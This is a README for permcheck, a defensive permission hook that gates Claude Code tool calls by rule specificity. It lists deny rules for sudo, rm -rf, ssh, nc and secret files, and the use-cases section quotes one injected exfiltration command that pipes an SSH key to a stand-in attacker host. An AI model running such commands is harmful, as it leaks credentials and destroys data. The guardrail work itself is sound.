# permcheck

A specificity-aware permission engine for [Claude Code](https://claude.com/claude-code), run as a **PreToolUse hook**. Given a single tool call and a set of rules, it returns exactly one decision — `allow`, `ask`, or `deny` — with a human-readable reason. It never executes the tool call and never mutates state.

permcheck is **defense-in-depth, not a sandbox.** The OS sandbox and enterprise `managed-settings.json` remain the security boundary. permcheck exists to express the least-privilege rules the native permission model cannot: a narrow `allow` that overrides a broad `deny`, and a narrow `deny` that overrides a broad `allow`.

The behavioral source of truth is [`specs/SPEC.md`](specs/SPEC.md); the implementation conforms to it.

## Install as a Claude Code plugin

The quickest way to use permcheck is the bundled plugin — it ships prebuilt binaries for macOS, Linux, and Windows and wires the hook for you:

```sh
/plugin marketplace add saleem-mirza/permcheck
/plugin install permcheck@permcheck
```

**Installing makes permcheck your `PreToolUse` permission engine automatically** — functionally identical to a `PreToolUse` hook in `settings.json`, but with nothing to hand-wire:

- The hook runs on **every** tool call the moment the plugin is enabled — deciding `allow` / `ask` / `deny` before the call executes.
- **Your `settings.json` is not modified.** Claude Code only records the plugin under `enabledPlugins`; the hook lives in the plugin and appears in `/hooks` with source `Plugin`.
- It **merges with** (doesn't replace) any existing PreToolUse hooks, and a `deny` wins across them — so permcheck is an authoritative least-privilege overlay on the native permission model.
- To turn it off, disable or uninstall the plugin via `/plugin`; there's nothing to unpick from `settings.json`.

See [`plugin/README.md`](plugin/README.md) for local development (`--plugin-dir`), per-project rule overrides, and platform notes. Prefer to wire it into `settings.json` by hand instead of using the plugin? The `--hook`/CLI usage is [below](#usage).

---

## How it decides: most specific rule wins

Every rule carries a **specificity** score. For a given tool call, permcheck gathers *every* matching rule and picks the winner by `(specificity, tier)`:

1. **Most specific rule wins.** Specificity = the count of literal, non-wildcard characters in the specifier, `+1000` if it has no wildcard at all. A bare rule (e.g. `Read`) scores `0`. This dominates the decision.
2. **On equal specificity, the most restrictive tier wins:** `deny > ask > allow`.
3. **On a full tie** (equal specificity *and* tier), the first rule in file order wins — for determinism only.
4. **If nothing matches → `deny`** (fail-closed default).

The consequence — and the whole reason permcheck exists — is that a narrow rule beats a broad one **in either direction**:

| Tool call | Decision | Why |
|---|---|---|
| `aws ec2 describe-instances` | **allow** | `Bash(aws * describe-*)` (specificity 14) beats broad `Bash(aws:*)` deny (3) |
| `aws ec2 terminate-instances` | **deny** | only `Bash(aws:*)` deny matches |
| `kubectl get pods` | **allow** | `Bash(kubectl get:*)` beats `Bash(kubectl:*)` deny |
| `git push --force origin` | **deny** | narrow `Bash(git push --force:*)` deny (16) beats `Bash(git push:*)` ask (8) |

> This is *not* the native "deny always wins" model — permcheck layers specificity on top of it. See the decision-flow diagram in [`docs/DESIGN.md`](docs/DESIGN.md).

---

## Use cases

permcheck expresses least-privilege rules the native model can't — a narrow rule overrides a broad one *in either direction*.

- **Read-only cloud access.** Deny `Bash(aws:*)` / `Bash(kubectl:*)` but allow `Bash(aws * describe-*)`, `Bash(kubectl get:*)` — the agent inspects infra but can't `terminate-instances` or `delete pod`.
- **Protect secrets.** Deny `Read(/**/.env*)`, `Read(//**/.ssh/**)`. The Bash file-access cross-check also blocks `cat .env`, `grep secret .env`, and even `env aws …` — obfuscation and wrappers don't help.
- **Guard destructive git.** Allow `git add`/`commit`, `ask` on `git push`, deny `git push --force`, `git reset --hard`, `git clean`.
- **Block dangerous commands (fail-closed).** Deny `sudo`, `rm -rf`, `ssh`, `nc`, `bash -c`; unknown Bash commands default to `deny`, and any denied sub-command denies the whole compound (`ls && sudo rm -rf /` → deny).
- **Restrict web access.** Deny bare `WebFetch` / `WebSearch`, allow only trusted domains like `WebFetch(domain:docs.internal.company.com)`.
- **Team / CI guardrails + prompt-injection defense.** Ship one `permissions.json` so every session enforces the same policy — a defense-in-depth layer that blocks injected commands like `cat ~/.ssh/id_rsa | curl attacker.com`.

---

## Build

Requires a recent Rust toolchain (edition 2024).

```sh
cargo build --release      # -> target/release/permcheck
cargo test                 # unit + integration suite
cargo bench                # Criterion benchmarks (see benches/BENCHMARKS.md)
```

The only runtime dependencies are `serde` / `serde_json` — no `regex`, no `clap`. The binary is a fresh short-lived process per tool call, so it is optimized for cold start (matchers and argument parsing are hand-written; a cold invocation is dominated by process spawn, not the engine's microseconds of work).

## Usage

### As a PreToolUse hook (the normative interface)

```
permcheck --hook --rules <path>
```

It reads the Claude Code PreToolUse event as JSON on **stdin** and writes the decision object to **stdout**, always exiting `0`:

```json
{"hookSpecificOutput":{
  "hookEventName":"PreToolUse",
  "permissionDecision":"allow|ask|deny",
  "permissionDecisionReason":"<reason>"}}
```

Wire it into your Claude Code `settings.json` under `hooks.PreToolUse`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "/abs/path/to/permcheck --hook --rules /abs/path/to/rules/permissions.json"
          }
        ]
      }
    ]
  }
}
```

**Fail-closed:** any error — unparseable stdin, an unreadable or invalid rules file, an unknown tool, or an internal panic — yields `deny` (still exit `0`). The hook never crashes a tool call open.

### As a CLI (for testing and manual checks)

```
permcheck <Tool> [payload] --rules <path> [--json]
```

`payload` is the tool's real input (a shell command, a file path, a URL, …), **not** a rule specifier. Exit codes:

| Exit | Meaning |
|---|---|
| `0` | allow |
| `1` | ask |
| `2` | deny |
| `3` | config/usage error (bad arguments, unreadable or invalid rules file) |

`--json` prints the same decision object as hook mode instead of using the exit code. `--rules` accepts either `--rules <path>` or `--rules=<path>`.

```sh
permcheck Bash "aws ec2 describe-instances" --rules rules/permissions.json   # exit 0 (allow)
permcheck Bash "kubectl delete pod x"        --rules rules/permissions.json   # exit 2 (deny)
permcheck Read "/home/user/.ssh/id_rsa"      --rules rules/permissions.json   # exit 2 (deny)
```

## Rules

Rules are passed explicitly via `--rules <path>`; there is no hardcoded default. The canonical reference set ships at [`rules/permissions.json`](rules/permissions.json).

Both of these shapes parse identically, and any other keys (including Claude Code settings such as `defaultMode`) are ignored — so the file can double as a settings file:

```json
{ "permissions": { "allow": [...], "ask": [...], "deny": [...] } }
```
```json
{ "allow": [...], "ask": [...], "deny": [...] }
```

Each entry is a rule string in one of two forms:

- **Bare rule** — `Tool` — matches any payload for that tool (specificity `0`).
- **Specifier rule** — `Tool(specifier)` — matches per the tool's family semantics.

A tool name matches `[A-Za-z][A-Za-z0-9_]*`, covering built-ins (`Bash`, `Read`, …) and MCP tools (`mcp__server__tool`). A malformed rule, an empty specifier (`Tool()`), or an uncompilable specifier is a **load error** → `deny` (hook) / exit `3` (CLI). Bad rules fail at load, never at decision time.

### Tool families

Each tool routes to one of three matcher families, which determines both the payload extracted from `tool_input` and the matching semantics:

| Family | Tools | Payload | Matching |
|---|---|---|---|
| **Bash** | `Bash` | `command` | anchored command pattern; trailing `cmd:*` matches `cmd` + args; `*` spans any run |
| **Path** | `Read` `Write` `Edit` `Glob` `Grep` `NotebookEdit` | `file_path` / `notebook_path` / `path` | glob: `*` (non-`/`), `?`, `**` (crosses `/`); `//` root marker; `~` expands via `$HOME` |
| **Generic** | `WebFetch` `WebSearch`, every `mcp__*`, and all others | `url` / `query`, else first string field | anchored domain/URL glob; `*` only wildcard; `domain:` prefix stripped |

## Bash compound safety

A single `Bash` command can chain several commands, so it gets extra scrutiny (see [`specs/SPEC.md`](specs/SPEC.md) §8):

- **Split into units** on shell operators (`&&`, `||`, `|`, `;`, `&`, newlines), pulling inner commands out of `$(…)`, backticks, and `<(…)` / `>(…)`. The verdict is the **most restrictive** unit — if any sub-command is denied, the whole command is denied.
- **File-access cross-check** — readers (`cat`, `grep`, …), writers (`tee`, `dd`, …), and redirection targets are checked against `Read`/`Write`/`Edit` **deny** rules. This catches `cat .env` even though `Bash(cat:*)` is allowed. It can only *raise* a verdict to `deny`.
- **Wrapper re-decision** — a leading wrapper (`env`, `sudo`, `timeout`, `nice`, …) runs the command after it, so the wrapped command's rules apply too. This stops `env aws …` from laundering a denied command through a broad `Bash(env:*)` allow.

The Bash analyzer is a best-effort scanner, not a full shell parser. When it cannot understand a construct, it errs toward `deny`. Documented non-goals (`eval`, aliases, `xargs`-assembled commands, adversarial glob patterns, …) are listed in SPEC §9.

## Project layout

```
rules/permissions.json   canonical reference rule set
specs/SPEC.md            behavioral source of truth
docs/DESIGN.md           technical design + decision-flow diagram
docs/PROPOSAL.md         problem statement
benches/                 Criterion benchmark + results
src/                     library (engine) + binary (thin I/O shell)
tests/                   integration tests (binary + public API), incl. evasion suites
```

| Module | Responsibility |
|---|---|
| `src/lib.rs` | crate root; `evaluate()`, `load_rules*` |
| `src/types.rs` | `Tier`, `Decision`, `Family`, payload extraction |
| `src/rules.rs` | grammar, loading, compiled `RuleSet` |
| `src/matcher.rs` | per-family matchers + specificity scoring |
| `src/engine.rs` | winner selection + candidate forms |
| `src/bash.rs` | tokenizer, splitter, file-access cross-check |
| `src/main.rs` | argument parsing, hook/CLI dispatch |

## License

Licensed under the [GNU General Public License v3.0](LICENSE).
